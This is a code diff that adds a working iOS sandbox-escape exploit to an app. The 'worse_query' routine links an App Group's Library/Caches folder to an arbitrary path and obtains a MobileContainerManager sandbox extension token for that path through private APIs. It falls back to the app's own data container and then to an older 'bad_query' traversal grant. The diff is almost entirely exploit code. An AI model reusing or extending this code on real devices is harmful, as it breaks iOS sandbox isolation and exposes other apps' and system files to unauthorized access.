@@ -309,6 +309,155 @@ static int64_t zdma_bad_query(const char *path, bool skipLstat, NSString *group,
 }
 
 // ---------------------------------------------------------------------------
+// worse_query: the App Group symlink grant X uses on iOS 26/27
+// ---------------------------------------------------------------------------
+//
+// X links `<group>/Library/Caches` to the path it wants, asks MCM for that
+// group's part 3 (Library/Caches, the same part the MobileGestalt PoC uses)
+// and consumes the returned token. MCM resolves the part before minting the
+// extension, so the extension ends up scoped to the symlink target instead of
+// the group container. The symlink is replaced with an empty directory right
+// afterwards, exactly like X's clean_symlink().
+
+typedef struct __SecTask *zdma_SecTaskRef;
+
+static NSString *zdma_first_app_group(void) {
+    static NSString *cached;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        NSArray *groups = nil;
+        void *createSym = dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
+        void *copySym = dlsym(RTLD_DEFAULT, "SecTaskCopyValueForEntitlement");
+        if (createSym && copySym) {
+            zdma_SecTaskRef (*createTask)(void) =
+                (zdma_SecTaskRef (*)(void))createSym;
+            CFTypeRef (*copyEntitlement)(zdma_SecTaskRef, CFStringRef, CFErrorRef *) =
+                (CFTypeRef (*)(zdma_SecTaskRef, CFStringRef, CFErrorRef *))copySym;
+            zdma_SecTaskRef task = createTask();
+            if (task) {
+                CFTypeRef value = copyEntitlement(
+                    task, CFSTR("com.apple.security.application-groups"), NULL);
+                if (value) {
+                    if (CFGetTypeID(value) == CFArrayGetTypeID()) {
+                        groups = (__bridge_transfer NSArray *)value;
+                    } else {
+                        CFRelease(value);
+                    }
+                }
+                CFRelease((CFTypeRef)task);
+            }
+        }
+        NSString *picked = nil;
+        for (id item in groups) {
+            if ([item isKindOfClass:[NSString class]] && [item length]) {
+                picked = item;
+                break;
+            }
+        }
+        if (groups.count) {
+            zdma_trace([NSString stringWithFormat:@"wq:groups %@",
+                        [groups componentsJoinedByString:@","]]);
+        } else {
+            zdma_trace(@"wq:no-group-entitlement");
+        }
+        cached = picked.length ? picked : @"group.cc.forcequit.worse-query";
+        zdma_trace([NSString stringWithFormat:@"wq:group %@", cached]);
+    });
+    return cached;
+}
+
+static void zdma_clean_worse_symlink(NSString *linkPath) {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    [fm removeItemAtPath:linkPath error:nil];
+    [fm createDirectoryAtPath:linkPath
+  withIntermediateDirectories:NO
+                   attributes:nil
+                        error:nil];
+}
+
+/// basePath must be the container MCM will resolve for `identifier`
+/// (`containerURLForSecurityApplicationGroupIdentifier:` for a group, the
+/// process data container for a normal class-2 identifier).
+static int64_t zdma_worse_query_grant(NSString *basePath,
+                                      NSString *identifier,
+                                      bool isGroup,
+                                      const char *targetC,
+                                      bool create) {
+    if (!targetC || targetC[0] != '/') return -255;
+    if (!create) {
+        struct stat st;
+        if (lstat(targetC, &st) != 0) return -255;
+    }
+    if (!basePath.length || !identifier.length) return -1;
+
+    zdma_load_api();
+    if (!gAPI.handle || !gAPI.query_create || !gAPI.set_class ||
+        !gAPI.set_group || !gAPI.set_identifiers || !gAPI.set_flags ||
+        !gAPI.set_part || !gAPI.get_single || !gAPI.copy_token ||
+        !gAPI.ext_consume || !gAPI.query_free) {
+        return -2;
+    }
+
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *library = [basePath stringByAppendingPathComponent:@"Library"];
+    [fm createDirectoryAtPath:library withIntermediateDirectories:YES attributes:nil error:nil];
+    NSString *linkPath = [library stringByAppendingPathComponent:@"Caches"];
+
+    void *query = gAPI.query_create();
+    if (!query) return -3;
+
+    gAPI.set_class(query, isGroup ? 7 : 2);
+    xpc_object_t value = xpc_string_create(identifier.UTF8String);
+    if (!value) {
+        gAPI.query_free(query);
+        return -3;
+    }
+    if (isGroup) gAPI.set_group(query, value);
+    else gAPI.set_identifiers(query, value);
+#if !OS_OBJECT_USE_OBJC
+    xpc_release(value);
+#endif
+    gAPI.set_part(query, 3);
+    gAPI.set_flags(query, isGroup ? 0x800000000ULL : 0x900000000ULL);
+
+    // Replace the caches directory with a link to the requested path. X does
+    // this after the query is configured and before get_single_result.
+    [fm removeItemAtPath:linkPath error:nil];
+    NSString *target = [NSString stringWithUTF8String:targetC];
+    NSError *linkError = nil;
+    if (![fm createSymbolicLinkAtPath:linkPath
+                 withDestinationPath:target
+                               error:&linkError]) {
+        zdma_trace([NSString stringWithFormat:@"wq:symlink-failed %@",
+                    linkError.localizedDescription ?: @""]);
+        gAPI.query_free(query);
+        zdma_clean_worse_symlink(linkPath);
+        return -4;
+    }
+
+    void *result = gAPI.get_single(query);
+    if (!result) {
+        zdma_trace(@"wq:no-result");
+        gAPI.query_free(query);
+        zdma_clean_worse_symlink(linkPath);
+        return -5;
+    }
+    char *token = gAPI.copy_token(result);
+    if (!token || token[0] == '\0') {
+        if (token) free(token);
+        zdma_trace(@"wq:no-token");
+        gAPI.query_free(query);
+        zdma_clean_worse_symlink(linkPath);
+        return -6;
+    }
+    int64_t handle = gAPI.ext_consume(token);
+    free(token);
+    gAPI.query_free(query);
+    zdma_clean_worse_symlink(linkPath);
+    return handle;
+}
+
+// ---------------------------------------------------------------------------
 // Class-2 lease through container_query
 // ---------------------------------------------------------------------------
 static ZDMAContainerLease *zdma_lease_for_bundle(NSString *bundleID, NSString **failure) {
@@ -610,25 +759,94 @@ static __attribute__((unused)) NSString *zdma_launchservices_container(NSString 
     return nil;
 }
 
-+ (BOOL)grantAccessToPath:(NSString *)path error:(NSError **)error {
++ (int64_t)acquireAccessToPath:(NSString *)path error:(NSError **)error {
     zdma_load_api();
     if (!path.length || !path.isAbsolutePath) {
         if (error) *error = zdma_error(EINVAL, @"Rruga e kontejnerit është e pavlefshme.", path);
-        return NO;
-    }
-    if (!gAPI.loaded) {
-        if (error) *error = zdma_error(ENOSYS, @"MCM API nuk u ngarkua.", nil);
-        return NO;
+        return -255;
     }
 
-    int64_t handle = zdma_bad_query(path.fileSystemRepresentation, true, nil, 0);
-    if (handle < 0) {
-        NSString *detail = [NSString stringWithFormat:
-                            @"bad_query kthoi %lld (path=%@, group=systemgroup.com.apple.mobilegestaltcache)",
-                            (long long)handle, path];
-        if (error) *error = zdma_error(EPERM, @"Sandbox extension dështoi.", detail);
-        return NO;
+    NSString *clean = [path stringByStandardizingPath];
+    while (clean.length > 1 && [clean hasSuffix:@"/"]) {
+        clean = [clean substringToIndex:clean.length - 1];
     }
+    zdma_trace([NSString stringWithFormat:@"wq:begin %@", clean]);
+
+    int64_t handle = -1;
+
+    // 1. X's iOS 26/27 path: symlink the App Group caches directory to the
+    //    target and let MCM hand out the resolved extension.
+    NSString *group = zdma_first_app_group();
+    NSURL *groupURL = [[NSFileManager defaultManager]
+                       containerURLForSecurityApplicationGroupIdentifier:group];
+    if (groupURL.path.length) {
+        zdma_trace([NSString stringWithFormat:@"wq:group-url %@", groupURL.path]);
+        handle = zdma_worse_query_grant(groupURL.path,
+                                        group,
+                                        true,
+                                        clean.fileSystemRepresentation,
+                                        true);
+        zdma_trace([NSString stringWithFormat:@"wq:group-result=%lld",
+                    (long long)handle]);
+    } else {
+        zdma_trace(@"wq:no-group-url");
+    }
+
+    // 2. No App Group entitlement: apply the same part-3 trick to our own
+    //    data container, which we can always write to.
+    if (handle < 0) {
+        NSString *selfRoot = NSHomeDirectory();
+        NSString *selfID = NSBundle.mainBundle.bundleIdentifier
+            ?: @"com.apple.mobile.MobileHouseArrest";
+        if (selfRoot.length && selfID.length &&
+            ![clean isEqualToString:selfRoot] &&
+            ![clean hasPrefix:[selfRoot stringByAppendingString:@"/"]]) {
+            zdma_trace(@"wq:self");
+            handle = zdma_worse_query_grant(selfRoot,
+                                            selfID,
+                                            false,
+                                            clean.fileSystemRepresentation,
+                                            true);
+            zdma_trace([NSString stringWithFormat:@"wq:self-result=%lld",
+                        (long long)handle]);
+        }
+    }
+
+    // 3. Legacy traversal grant (iOS 18.x-26.0.x).
+    if (handle < 0) {
+        zdma_trace(@"wq:bad_query");
+        handle = zdma_bad_query(clean.fileSystemRepresentation, true, nil, 0);
+        zdma_trace([NSString stringWithFormat:@"wq:bad-result=%lld",
+                    (long long)handle]);
+    }
+
+    if (handle < 0) {
+        if (error) {
+            *error = zdma_error(EPERM,
+                                @"Sandbox extension dështoi.",
+                                [NSString stringWithFormat:
+                                 @"worse_query/bad_query kthoi %lld (path=%@, group=%@)",
+                                 (long long)handle, clean, group]);
+        }
+        return handle;
+    }
+    zdma_trace([NSString stringWithFormat:@"wq:ok=%lld", (long long)handle]);
+    return handle;
+}
+
++ (void)releaseAccess:(int64_t)handle {
+    if (handle <= 0) return;
+    zdma_load_api();
+    if (gAPI.ext_release) gAPI.ext_release(handle);
+}
+
++ (NSString *)worseQueryGroup {
+    return zdma_first_app_group();
+}
+
++ (BOOL)grantAccessToPath:(NSString *)path error:(NSError **)error {
+    int64_t handle = [self acquireAccessToPath:path error:error];
+    if (handle < 0) return NO;
 
     [gLock lock];
     NSNumber *previous = gBadQueryHandles[path];
